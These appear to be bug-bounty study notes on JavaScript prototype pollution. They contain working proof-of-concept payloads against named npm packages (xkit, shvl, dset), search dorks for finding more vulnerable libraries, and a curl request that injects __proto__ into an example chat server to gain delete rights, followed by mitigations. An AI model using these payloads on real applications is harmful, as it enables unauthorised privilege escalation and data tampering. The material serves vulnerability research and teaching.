https://www.huntr.dev/bounties/1-npm-shvl/
https://www.huntr.dev/bounties/1-npm-xkit/
https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2

# What is this?
PP refers the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`
 An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain.
 

payload:
```JavaScript
const set = require('xkit/util/set-path-value')

console.log('Before:', {}.polluted)
set({}, '__proto__.polluted', true)
console.log('After:', {}.polluted)
```

```JavaScript
var shvl = require("shvl")
let obj = {}
console.log("Before : " + {}.polluted);
shvl.set(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + {}.polluted);
```

> npm i package
> node poc.js

POC:
```JavaScript
const js = require("module-name");
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
js.utils.deepMixIn(obj, payload);
console.log("After : " + {}.polluted);
```

Example:
```JavaScript
var dset = require("dset")
var obj = {}
console.log("Before : " + {}.polluted);
dset(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + {}.polluted);
```
*Now check After and Before values*


Resources to look for:

1. Google(As always)
2. Npm repository
3. Github
4. Grep.app, CodeQL
5. Obsolete dependencies

Keywords to search for:

- clone
- merge
- set
- deep
- copy
- assign
- recursive
- extend

Example:
Google: site: www.npmjs.com inurl:package "clone" "set" "copy" 
grep.app: =clone(
npmjs: set clone

## Prototype Pollution in webapps

So we have an application which supports 

**Example Application**

This is example chat server vulnerable to Prototype Pollution.

- `GET /` - List all messages (available without authentication).
  ```bash
  curl --request GET --url http://localhost:3000/
  ```
- `PUT /` - Post a new message (only registered users).
  ```bash
  curl --request PUT 
    --url http://localhost:3000/ 
    --header 'content-type: application/json' 
    --data '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'
  ```
- `DELETE /` - Delete a message (only administrators).
  ```bash
  curl --request DELETE 
    --url http://localhost:3000/ 
    --header 'content-type: application/json' 
    --data '{"auth": {"name": "admin", "password": "???"}, "messageId": 2}'
  ```

**How to exploit:**
1. Send evil message with `__proto__`
```bash
curl --request PUT \
  --url http://localhost:3000/ \
  --header 'content-type: application/json' \
  --data '{"auth": {"name": "user", "password": "pwd"}, "message": { "text": "😈", "__proto__": {"canDelete": true}}}'

```

# Mitigation
- avoid writing to object prototype
- Ignore dangrous keys
	- __proto__, constructor key
- Freeze the prototype:
	- Object.freeze(Object.prototype)

